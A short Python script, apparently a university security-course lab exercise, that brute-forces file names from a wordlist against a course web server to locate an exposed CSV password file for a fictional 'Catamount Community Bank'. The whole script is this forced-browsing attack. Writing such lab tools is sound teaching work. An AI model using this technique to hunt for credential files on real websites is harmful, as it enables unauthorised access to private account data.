"""
Catamount Community Bank - CSV password file retrieval.

A program to search for a csv using common file names.

Sources: https://www.geeksforgeeks.org/response-status_code-python-requests/
         https://hackernoon.com/how-to-read-text-file-in-python
"""

import requests
import sys

base = 'http://jreddy1.w3.uvm.edu/cs2660/accounts/'

if __name__ == "__main__":

    try:
        file = open("./words_to_test.txt", "r")
        content = file.readline().strip()
        while content:
            request = base + content + ".csv"
            response = requests.get(request)
            if response.status_code != 404:
                print(request)
                break
            content = file.readline().strip()
    except FileNotFoundError:
        print("Error opening words_to_test file")
        sys.exit()
